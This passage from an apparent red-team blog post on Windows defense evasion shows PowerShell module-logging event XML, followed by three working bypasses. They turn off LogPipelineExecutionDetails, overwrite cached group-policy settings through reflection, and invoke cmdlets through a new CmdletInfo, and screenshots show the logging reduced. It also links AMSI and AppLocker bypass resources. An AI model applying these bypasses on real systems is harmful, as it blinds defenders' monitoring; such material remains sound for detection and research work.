/&gt; </span><br><span class="line">  &lt;Execution ProcessID=<span class="string">&quot;2236&quot;</span> ThreadID=<span class="string">&quot;7736&quot;</span> /&gt; </span><br><span class="line">  &lt;Channel&gt;Microsoft<span class="literal">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class="line">  &lt;Computer&gt;DESKTOP<span class="literal">-47K3P38</span>&lt;/Computer&gt; </span><br><span class="line">  &lt;Security UserID=<span class="string">&quot;S-1-5-21-3540393959-771636146-431249527-1001&quot;</span> /&gt; </span><br><span class="line">  &lt;/System&gt;</span><br><span class="line">- &lt;EventData&gt;</span><br><span class="line">  &lt;<span class="keyword">Data</span> Name=<span class="string">&quot;ContextInfo&quot;</span>&gt;Severity = Informational Host Name = ConsoleHost Host Version = <span class="number">5.1</span>.<span class="number">19041.2673</span> Host ID = <span class="number">80</span>aae10f<span class="literal">-5d8d-48fd-ad14-389df84528c7</span> Host Application = C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe Engine Version = <span class="number">5.1</span>.<span class="number">19041.2673</span> Runspace ID = c5b9897e<span class="literal">-6c29-42d0-a784-bc369f276c7e</span> Pipeline ID = <span class="number">18</span> Command Name = <span class="built_in">Write-Host</span> Command <span class="built_in">Type</span> = Cmdlet Script Name = Command Path = Sequence Number = <span class="number">48</span> User = DESKTOP<span class="literal">-47K3P38</span>\<span class="number">3</span>atef Connected User = Shell ID = Microsoft.PowerShell&lt;/<span class="keyword">Data</span>&gt; </span><br><span class="line">  &lt;<span class="keyword">Data</span> Name=<span class="string">&quot;UserData&quot;</span> /&gt; </span><br><span class="line">  &lt;<span class="keyword">Data</span> Name=<span class="string">&quot;Payload&quot;</span>&gt;CommandInvocation(<span class="built_in">Write-Host</span>): <span class="string">&quot;Write-Host&quot;</span> ParameterBinding(<span class="built_in">Write-Host</span>): name=<span class="string">&quot;Object&quot;</span>; value=<span class="string">&quot;@N1NJ10 was here&quot;</span>&lt;/<span class="keyword">Data</span>&gt; </span><br><span class="line">  &lt;/EventData&gt;</span><br><span class="line">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure></figure>

<ul>
<li>Out-Default : This is likely logged when the prompt is displayed after your command, as PowerShell uses Out-Default to handle the prompt output, even if Write-Host doesn’t produce pipeline output.</li>
</ul>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">- &lt;Event xmlns=<span class="string">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class="line">- &lt;System&gt;</span><br><span class="line">  &lt;Provider Name=<span class="string">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class="string">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class="line">  &lt;EventID&gt;<span class="number">4103</span>&lt;/EventID&gt; </span><br><span class="line">  &lt;Version&gt;<span class="number">1</span>&lt;/Version&gt; </span><br><span class="line">  &lt;Level&gt;<span class="number">4</span>&lt;/Level&gt; </span><br><span class="line">  &lt;Task&gt;<span class="number">106</span>&lt;/Task&gt; </span><br><span class="line">  &lt;Opcode&gt;<span class="number">20</span>&lt;/Opcode&gt; </span><br><span class="line">  &lt;Keywords&gt;<span class="number">0</span>x0&lt;/Keywords&gt; </span><br><span class="line">  &lt;TimeCreated SystemTime=<span class="string">&quot;2025-07-20T23:17:27.8238426Z&quot;</span> /&gt; </span><br><span class="line">  &lt;EventRecordID&gt;<span class="number">287</span>&lt;/EventRecordID&gt; </span><br><span class="line">  &lt;Correlation ActivityID=<span class="string">&quot;&#123;188710b5-f9b6-0002-d03b-8718b6f9db01&#125;&quot;</span> /&gt; </span><br><span class="line">  &lt;Execution ProcessID=<span class="string">&quot;2236&quot;</span> ThreadID=<span class="string">&quot;7736&quot;</span> /&gt; </span><br><span class="line">  &lt;Channel&gt;Microsoft<span class="literal">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class="line">  &lt;Computer&gt;DESKTOP<span class="literal">-47K3P38</span>&lt;/Computer&gt; </span><br><span class="line">  &lt;Security UserID=<span class="string">&quot;S-1-5-21-3540393959-771636146-431249527-1001&quot;</span> /&gt; </span><br><span class="line">  &lt;/System&gt;</span><br><span class="line">- &lt;EventData&gt;</span><br><span class="line">  &lt;<span class="keyword">Data</span> Name=<span class="string">&quot;ContextInfo&quot;</span>&gt;Severity = Informational Host Name = ConsoleHost Host Version = <span class="number">5.1</span>.<span class="number">19041.2673</span> Host ID = <span class="number">80</span>aae10f<span class="literal">-5d8d-48fd-ad14-389df84528c7</span> Host Application = C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe Engine Version = <span class="number">5.1</span>.<span class="number">19041.2673</span> Runspace ID = c5b9897e<span class="literal">-6c29-42d0-a784-bc369f276c7e</span> Pipeline ID = <span class="number">18</span> Command Name = Command <span class="built_in">Type</span> = Script Script Name = Command Path = Sequence Number = <span class="number">50</span> User = DESKTOP<span class="literal">-47K3P38</span>\<span class="number">3</span>atef Connected User = Shell ID = Microsoft.PowerShell&lt;/<span class="keyword">Data</span>&gt; </span><br><span class="line">  &lt;<span class="keyword">Data</span> Name=<span class="string">&quot;UserData&quot;</span> /&gt; </span><br><span class="line">  &lt;<span class="keyword">Data</span> Name=<span class="string">&quot;Payload&quot;</span>&gt;CommandInvocation(<span class="built_in">Out-Default</span>): <span class="string">&quot;Out-Default&quot;</span>&lt;/<span class="keyword">Data</span>&gt; </span><br><span class="line">  &lt;/EventData&gt;</span><br><span class="line">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure></figure>

<ul>
<li>Set-StrictMode : This is called by the PSReadLine module, possibly as part of its configuration or internal operations, <strong>and is captured because module logging is enabled for the session. ( So this mean if u call any cmdlet this Event log will be triggered )</strong></li>
</ul>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">- &lt;Event xmlns=<span class="string">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class="line">- &lt;System&gt;</span><br><span class="line">  &lt;Provider Name=<span class="string">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class="string">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class="line">  &lt;EventID&gt;<span class="number">4103</span>&lt;/EventID&gt; </span><br><span class="line">  &lt;Version&gt;<span class="number">1</span>&lt;/Version&gt; </span><br><span class="line">  &lt;Level&gt;<span class="number">4</span>&lt;/Level&gt; </span><br><span class="line">  &lt;Task&gt;<span class="number">106</span>&lt;/Task&gt; </span><br><span class="line">  &lt;Opcode&gt;<span class="number">20</span>&lt;/Opcode&gt; </span><br><span class="line">  &lt;Keywords&gt;<span class="number">0</span>x0&lt;/Keywords&gt; </span><br><span class="line">  &lt;TimeCreated SystemTime=<span class="string">&quot;2025-07-20T23:17:27.8268015Z&quot;</span> /&gt; </span><br><span class="line">  &lt;EventRecordID&gt;<span class="number">288</span>&lt;/EventRecordID&gt; </span><br><span class="line">  &lt;Correlation ActivityID=<span class="string">&quot;&#123;188710b5-f9b6-0000-af3a-8718b6f9db01&#125;&quot;</span> /&gt; </span><br><span class="line">  &lt;Execution ProcessID=<span class="string">&quot;2236&quot;</span> ThreadID=<span class="string">&quot;7736&quot;</span> /&gt; </span><br><span class="line">  &lt;Channel&gt;Microsoft<span class="literal">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class="line">  &lt;Computer&gt;DESKTOP<span class="literal">-47K3P38</span>&lt;/Computer&gt; </span><br><span class="line">  &lt;Security UserID=<span class="string">&quot;S-1-5-21-3540393959-771636146-431249527-1001&quot;</span> /&gt; </span><br><span class="line">  &lt;/System&gt;</span><br><span class="line">- &lt;EventData&gt;</span><br><span class="line">  &lt;<span class="keyword">Data</span> Name=<span class="string">&quot;ContextInfo&quot;</span>&gt;Severity = Informational Host Name = ConsoleHost Host Version = <span class="number">5.1</span>.<span class="number">19041.2673</span> Host ID = <span class="number">80</span>aae10f<span class="literal">-5d8d-48fd-ad14-389df84528c7</span> Host Application = C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe Engine Version = <span class="number">5.1</span>.<span class="number">19041.2673</span> Runspace ID = c5b9897e<span class="literal">-6c29-42d0-a784-bc369f276c7e</span> Pipeline ID = <span class="number">20</span> Command Name = <span class="built_in">Set-StrictMode</span> Command <span class="built_in">Type</span> = Cmdlet Script Name = C:\Program Files\WindowsPowerShell\Modules\PSReadline\<span class="number">2.0</span>.<span class="number">0</span>\PSReadLine.psm1 Command Path = Sequence Number = <span class="number">52</span> User = DESKTOP<span class="literal">-47K3P38</span>\<span class="number">3</span>atef Connected User = Shell ID = Microsoft.PowerShell&lt;/<span class="keyword">Data</span>&gt; </span><br><span class="line">  &lt;<span class="keyword">Data</span> Name=<span class="string">&quot;UserData&quot;</span> /&gt; </span><br><span class="line">  &lt;<span class="keyword">Data</span> Name=<span class="string">&quot;Payload&quot;</span>&gt;CommandInvocation(<span class="built_in">Set-StrictMode</span>): <span class="string">&quot;Set-StrictMode&quot;</span> ParameterBinding(<span class="built_in">Set-StrictMode</span>): name=<span class="string">&quot;Off&quot;</span>; value=<span class="string">&quot;True&quot;</span>&lt;/<span class="keyword">Data</span>&gt; </span><br><span class="line">  &lt;/EventData&gt;</span><br><span class="line">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure></figure>

<p>So the write-host cmdlet make 3 event logs ( Write-Host , Out-Default , Set-StrictMode ) so if we success to disable the Module logging we will see 1 event , Let’s do it</p>
<p>In this blog by <a target="_blank" rel="noopener" href="https://bc-security.org/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/">HUBBL3</a> , We can see that it’s not possible to completely block module logging for all modules (even if we use <code>*</code> to include all modules in logging). However, it is possible to bypass logging for specific cmdlets</p>
<blockquote>
<ul>
<li>When the <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_eventlogs?view=powershell-5.1#logging-module-events"><strong>LogPipelineExecutionDetails</strong></a>property value is <code>$true</code>, Windows PowerShell writes cmdlet and function execution events in the session to the Windows PowerShell log in Event Viewer. The setting is effective only in the current session.</li>
<li>A PowerShell snap-in is a .NET assembly (typically a DLL) that contains a collection of cmdlets, providers, and sometimes other components that extend PowerShell’s functionality.</li>
<li>The “4103” Event-ID is for the Module loggin</li>
<li>Path for the Events : Event Viewer -&gt; Applications and Services -&gt; Microsoft -&gt; Windows -&gt; PowerShell -&gt; Operational<br>{: .prompt-info }</li>
</ul>
</blockquote>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Recon</span></span><br><span class="line">(<span class="built_in">Get-Command</span> <span class="built_in">Write-Host</span>).module</span><br><span class="line"><span class="built_in">Get-PSSnapin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bypass 1 </span></span><br><span class="line"><span class="variable">$module</span> = <span class="built_in">Get-Module</span> Microsoft.PowerShell.Utility</span><br><span class="line"><span class="variable">$module</span>.LogPipelineExecutionDetails = <span class="variable">$false</span></span><br><span class="line"><span class="variable">$Snapin</span> = <span class="built_in">Get-PSSnapin</span> Microsoft.PowerShell.Core</span><br><span class="line"><span class="variable">$Snapin</span>.LogPipelineExecutionDetails = <span class="variable">$false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bypass 2 </span></span><br><span class="line"></span><br><span class="line"><span class="variable">$GroupPolicy</span> =[<span class="type">ReF</span>].assembly.GetType(<span class="string">&#x27;System.Management.Automation.Utils&#x27;</span>).GetFielD(<span class="string">&#x27;cachedGroupPolicySettings&#x27;</span>,<span class="string">&#x27;NonPublic,Static&#x27;</span>).GetValue(<span class="variable">$nULL</span>);</span><br><span class="line"><span class="variable">$val</span>=[<span class="type">Collections.Generic.Dictionary</span>[<span class="built_in">String</span>,<span class="type">System.Object</span>]]::new();</span><br><span class="line"><span class="variable">$Val</span>.Add(<span class="string">&#x27;EnableModuleLogging&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$Val</span>.add(<span class="string">&#x27;ModuleNames&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="variable">$GroupPolicy</span>[<span class="string">&#x27;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging&#x27;</span>]=<span class="variable">$VaL</span></span><br><span class="line"><span class="built_in">Import-Module</span> Microsoft.Powershell.Utility <span class="literal">-Force</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bypass 3 </span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Cmd</span> = [<span class="type">System.Management.Automation.CmdletInfo</span>]::new(<span class="string">&quot;Write-Host&quot;</span>, [<span class="type">Microsoft.PowerShell.Commands.WriteHostCommand</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Test </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;@N1NJ10 was here&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Test for Bypass 3 </span></span><br><span class="line"></span><br><span class="line">&amp; <span class="variable">$Cmd</span> <span class="string">&quot;@N1NJ10 was here&quot;</span></span><br></pre></td></tr></table></figure></figure>

<p>Let’s see what event that the first bypass will trigger</p>
<p>With the logic we can count them without any execute , They are 4 lines 2 of them execute a change in the session without any output so there will be</p>
<ul>
<li>4 From the PSConsoleHostReadLine</li>
<li>2 From an unknown Events ( Like the Write-Host … )</li>
</ul>
<p>Let’s see</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def37.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>As we expect there are 6 events trigger ( 2 of them are warrning with Event-ID 4104 )</p>
<blockquote>
<ul>
<li>Don’t Forget to Clear the logs after some operations to see what the new operations new logs</li>
<li>If you use script block you will get 2 events<br>{: .prompt-tip }</li>
</ul>
</blockquote>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def38.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>So , Let’s test to see if this work</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def39.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>Great , It worked the Write-Host now tigger 1 Event log ( PSConsoleHostReadLine )</p>
<h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><p>I don’t talk about automated tools because you can find many writeups talking about them but in the future, I will update this post with some tools that I use in my engagement and some scenarios</p>
<p>I will provide you with some of these resources enjoy :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://amsi.fail/">Amsi.fail</a></li>
<li><a target="_blank" rel="noopener" href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/">Exploring PowerShell AMSI and Logging Evasion</a></li>
<li><a target="_blank" rel="noopener" href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">Bypass AMSI by manual modification</a></li>
<li><a target="_blank" rel="noopener" href="https://answers.microsoft.com/en-us/windowserver/forum/all/powershell-get-information-about-antivirus/9207ebfa-ff97-48f0-b133-dde4cfd4abca">PowerShell get information about AntiVirus</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation/blob/main/Exercise%202/Sample_1.ps1">Beginners-Guide-to-Obfuscation</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=wvKwk1wcXvM&list=PLqyUgadpThTJVR6I3FQSBE3mLElxQkcbh&t=1457s">Evading Detection: A Beginner’s Guide to Obfuscation - 2022</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/">A Detailed Guide on AMSI Bypass</a></li>
<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/evasion/av/obfuscation">the hacker recipes obfuscation</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/gatariee/gocheck">gocheck</a></li>
<li><a target="_blank" rel="noopener" href="https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/">AMSI BYPASS AND EVASION</a></li>
<li><a target="_blank" rel="noopener" href="https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b">AMSI Bypass Memory Patch Technique in 2024</a></li>
<li><a target="_blank" rel="noopener" href="https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/">amsi-bypass-methods</a></li>
<li><a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">lolbas-project</a></li>
<li><a target="_blank" rel="noopener" href="https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html">The Internals of AppLocker</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/">Windows Applocker Policy – A Beginner’s Guide</a></li>
<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2021/05/17/persistence-amsi/">persistence-amsi</a></li>
<li><a target="_blank" rel="noopener" href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/#what-does-constrained-language-constrain">Constrained Language constrain?</a> - <a target="_blank" rel="noopener" href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/">What is PowerShell Constrained Language?</a></li>
<li><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/code-execution/t1118-installutil">InstallUtil</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/khr0x40sh/WhiteListEvasion">WhiteListEvasion</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/vinsworldcom/NetCat64/releases">NetCat64</a></li>
<li><a target="_blank" rel="noopener" href="https://sp00ks-git.github.io/posts/CLM-Bypass/">CLM-Bypass</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/microsoft/AaronLocker">AaronLocker</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.improsec.com/tech-blog/one-thousand-and-one-application-blocks">one-thousand-and-one-application-blocks</a></li>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">sysmon</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/mgeeky/Stracciatella">Stracciatella</a></li>
<li>Manual Pages</li>
</ul>
</div></article><section class="post-bottom-topic mt-6 pt-5 pb-4"><p class="has-text-weight-semibold is-family-serif">Windows Defense Evasion Guide</p><a class="button is-default mt-2 has-text-weight-semibold" href="#postTitle" rel="nofollow">Click back to the top</a></section></div></div><div id="footer"></div><div class="columns is-flex-desktop is-justify-content-center comment-container is-flex-direction-row-reverse mt-1 pt-3" id="commentContainer"><aside class="column is-4-tablet is-3-widescreen post-container"><main class="aside-card-container search-widget is-relative" id="searchContainer"><label for="searchInput"><div class="is-flex px-4" id="searchButton"><svg class="icon mr-1"><use xlink:href="#icon-search"></use></svg><input class="search-input is-flex-grow-1" id="searchInput" placeholder="' or 1=1--"></div></label><section class="search-content content" id="searchContent"></section></main><script>(function() {
    var columnsEl = document.getElementById('columns')
    var searchContainerEl = document.getElementById('searchContainer')
    var searchInputEl = document.getElementById('searchInput')
    var searchButtonEl = document.getElementById('searchButton')
    var searchResultEl = document.getElementById('searchContent')
    var commentEl = document.getElementById('commentContainer')

    searchInputEl.onfocus = function() {
        searchContainerEl.classList.add("focus-within")
        columnsEl && columnsEl.classList.add("focus-within")
        commentEl && commentEl.classList.add("focus-within")
    }

    searchInputEl.onblur = function(evt) {
        if (!evt.srcElement.value.trim()) {
            searchContainerEl.classList.remove("focus-within")
            columnsEl && columnsEl.classList.remove("focus-within")
            commentEl && commentEl.classList.remove("focus-within")
        }
    }

    searchInputEl.oninput = function (evt) {
        var searchValue = evt.srcElement.value
        var haveSearchValue = Boolean(searchValue.trim())
        if (!haveSearchValue) {
            searchResultEl.style.maxHeight = 0
            return
        }


        var searchResults = searching(searchValue)

        if (searchResults.length > 0) {
            renderSearchResults(searchResults, searchResultEl)
        }
    }

    searchButtonEl.onclick = function () {
        if (searchDatabase.length > 0) return;

        fetch('/search.xml').then(res => res.text()).then(res => {
            var domparser = new DOMParser
            var doc = domparser.parseFromString(res, 'application/xml')
            searchDatabase = doc.getElementsByTagName('search')[0].children
        })
    }
})()</script><span id="beforeA"></span><span id="afterA"></span><script>(adsbygoogle = window.adsbygoogle || []).push({})</script></aside><section class="column comment-box" id="commentBox"></section></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Mastodon--><!-- Bluesky--><!-- Matrix--><!-- Twitter--><!-- Weibo--><!-- Telegram--><a title="Telegram" target="_blank" rel="noopener nofollow" href="https://t.me/RedTeamRecipes"><svg class="icon has-text-grey"><use xlink:href="#icon-telegram"></use></svg></a><!-- Email--><a title="E-mail" target="_blank" rel="noopener nofollow" href="mailto:contact@redteamrecipes.com"><svg class="icon has-text-grey"><use xlink:href="#icon-mail-fill"></use></svg></a><!-- Github--><a title="GitHub" target="_blank" rel="noopener nofollow" href="https://github.com/RedTeamRecipes"><svg class="icon has-text-grey"><use xlink:href="#icon-github-fill"></use></svg></a><!-- Ins--><!-- RSS--><a title="RSS" target="_blank" rel="noopener nofollow" href="/feed.atom"><svg class="icon has-text-grey"><use xlink:href="#icon-feed"></use></svg></a></section><p><span>Copyright ©</span><span> RedTeam Recipes. </span><span></span></p><div><span><p>Use these notes responsibly.</p></span></div></footer><script src="/js/common.js"></script><script>$posts.mounted()</script><script>var searchDatabase = []

function renderSearchResults(results, searchResultEl) {
    searchResultEl.innerHTML = null
    var fragment = document.createDocumentFragment()

    results.forEach(function (item) {
        var link = document.createElement('a')
        var title = document.createElement('h5')
        var content = document.createElement('p')

        title.className = 'mb-1'
        title.innerText = item.title
        content.innerHTML = item.content

        link.href = item.link
        link.appendChild(title)
        link.appendChild(content)
        link.className = 'p-4 is-block'

        fragment.appendChild(link)
    })

    searchResultEl.appendChild(fragment)
    searchResultEl.style.maxHeight = '550px'
}

function searching(inputText) {
    var inputTexts = inputText.split(' ')
    var searchResults = []
    inputTexts.forEach(function (searchKey) {
        var haveSearchValue = Boolean(searchKey.trim())
        if (!haveSearchValue) return

        var key = searchKey.toLowerCase()

        for (var entry of searchDatabase) {
            var title = entry.getElementsByTagName('title')[0].textContent
            var link = entry.getElementsByTagName('link')[0].getAttribute('href')
            var contentWithTags = entry.getElementsByTagName('content')[0].textContent
            var content = contentWithTags.trim().replace(/<[^>]+>/g, '')
            var rawContent = content.toLowerCase()

            var LENGTH = 80
            var finalContent = ''
            var contentLength = rawContent.length
            var searchResultIdx = rawContent.indexOf(key)

            var startIdx = searchResultIdx - 20,
                endIdx = startIdx + LENGTH

            if (startIdx < 0) {
                startIdx = 0
                endIdx = 100
            }

            endIdx > contentLength && (endIdx = contentLength)

            finalContent = content.substring(startIdx, endIdx)

            if (title.toLowerCase().indexOf(key) > -1) {
                searchResults.unshift({
                    link: link,
                    title: title,
                    content: finalContent,
                })
            } else if (searchResultIdx > -1) {
                searchResults.push({
                    link: link,
                    title: title,
                    content: finalContent,
                })
            }
        }
    })
    return searchResults
}
</script><script>$claudia.fadeInImage(null, $claudia.blurBackdropImg)

window.addEventListener('resize', $claudia.throttle(function () {
  var images = document.querySelectorAll('.js-img-fadeIn')
  images.forEach($claudia.blurBackdropImg)
}, 150))

var timeout

function videoScroll () {
  if (timeout) {
    clearTimeout(timeout)
  }
  timeout = setTimeout(function () {
    var hasHover = false
    document.querySelectorAll('.tlo-header').forEach(function (header) {
      if (!hasHover && header.getBoundingClientRect().top + header.clientHeight < window.innerHeight && header.getBoundingClientRect().top > 58) {
        header.classList.add('hover')
        hasHover = true

        var video = header.querySelector('stream')
        if (video) {
          if (!video['data-playing']) {
            video.parentNode.classList.add('skeleton-with-content')
          }
          if (!video['data-loaded']) {
            video['data-loaded'] = true
          }
          try {
            video.play()
          } catch(_) {
            video['data-playing'] = true
            video.parentNode.classList.remove('skeleton-with-content')
          }
        }
      } else {
        header.classList.remove('hover')

        var video = header.querySelector('stream')
        if (video) {
          video.parentNode.classList.remove('skeleton-with-content')
          video.pause()
          video['data-loaded'] = false
        }
      }
    })
  }, 100)
}
</script><svg aria-hidden="true" style="position: absolute; width: 0px; height: 0px; overflow: hidden;">
  <symbol id="icon-location-fill" viewBox="0 0 1024 1024"><path d="M512 327c-29.9 0-58 11.6-79.2 32.8C411.7 381 400 409.1 400 439c0 29.9 11.7 58 32.8 79.2C454 539.3 482.1 551 512 551c29.9 0 58-11.7 79.2-32.8C612.4 497 624 468.9 624 439c0-29.9-11.6-58-32.8-79.2S541.9 327 512 327z"></path><path d="M854.6 289.1c-18.8-43.4-45.7-82.3-79.9-115.7-34.2-33.4-73.9-59.5-118.2-77.8C610.7 76.6 562.1 67 512 67c-50.1 0-98.7 9.6-144.5 28.5-44.3 18.3-84 44.5-118.2 77.8-34.2 33.4-61.1 72.4-79.9 115.7-19.5 45-29.4 92.8-29.4 142 0 70.6 16.9 140.9 50.1 208.7 26.7 54.5 64 107.6 111 158.1 80.3 86.2 164.5 138.9 188.4 153 6.9 4.1 14.7 6.1 22.4 6.1 7.8 0 15.5-2 22.4-6.1 23.9-14.1 108.1-66.8 188.4-153 47-50.4 84.3-103.6 111-158.1C867.1 572 884 501.8 884 431.1c0-49.2-9.9-97-29.4-142zM512 615c-97.2 0-176-78.8-176-176s78.8-176 176-176 176 78.8 176 176-78.8 176-176 176z"></path></symbol>
  <symbol id="icon-search" viewBox="0 0 1024 1024"><path d="M909.6 854.5L649.9 594.8C690.2 542.7 712 479 712 412c0-80.2-31.3-155.4-87.9-212.1-56.6-56.7-132-87.9-212.1-87.9s-155.5 31.3-212.1 87.9C143.2 256.5 112 331.8 112 412c0 80.1 31.3 155.5 87.9 212.1C256.5 680.8 331.8 712 412 712c67 0 130.6-21.8 182.7-62l259.7 259.6c3.2 3.2 8.4 3.2 11.6 0l43.6-43.5c3.2-3.2 3.2-8.4 0-11.6zM570.4 570.4C528 612.7 471.8 636 412 636s-116-23.3-158.4-65.6C211.3 528 188 471.8 188 412s23.3-116.1 65.6-158.4C296 211.3 352.2 188 412 188s116.1 23.2 158.4 65.6S636 352.2 636 412s-23.3 116.1-65.6 158.4z"></path></symbol>
  <symbol id="icon-feed" viewBox="0 0 1024 1024"><path d="M320.374394 768q0 45.714286-32 77.714286t-77.714285 32-77.714286-32-32-77.714286 32-77.714286 77.714286-32 77.714285 32 32 77.714286z m292.571429 70.285714q1.142857 16-9.714286 27.428572-10.285714 12-26.857143 12H499.231537q-14.285714 0-24.571428-9.428572t-11.428572-23.714285q-12.571429-130.857143-105.428571-223.714286T134.08868 515.428571q-14.285714-1.142857-23.714286-11.428571T100.945823 479.428571V402.285714q0-16.571429 12-26.857143 9.714286-9.714286 24.571428-9.714285h2.857143q91.428571 7.428571 174.857143 46T463.231537 515.428571q65.142857 64.571429 103.714286 148t46 174.857143z m292.571428 1.142857q1.142857 15.428571-10.285714 26.857143-10.285714 11.428571-26.285714 11.428572h-81.714286q-14.857143 0-25.428571-10T750.660109 843.428571q-6.857143-122.857143-57.714286-233.428571t-132.285714-192-192-132.285714T135.231537 227.428571q-14.285714-0.571429-24.285714-11.142857T100.945823 191.428571V109.714286q0-16 11.428571-26.285715 10.285714-10.285714 25.142857-10.285714h1.714286q149.714286 7.428571 286.571429 68.571429T668.945823 309.714286q106.857143 106.285714 168 243.142857t68.571428 286.571428z"></path></symbol>
